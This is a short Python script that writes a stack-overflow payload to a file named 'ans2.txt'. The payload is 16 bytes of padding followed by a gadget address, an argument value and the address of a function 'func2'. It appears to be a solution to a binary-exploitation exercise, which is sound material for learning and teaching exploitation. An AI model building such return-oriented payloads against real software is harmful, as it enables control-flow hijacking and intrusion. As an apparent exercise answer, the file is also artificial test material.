import struct

p=b'A'*16
aa=struct.pack('<Q',0x4012c7)
bb=struct.pack('<Q',0x3f8)
func2=struct.pack('<Q',0x401216)

payload=p+aa+bb+func2
with open("ans2.txt","wb") as f:
    f.write(payload)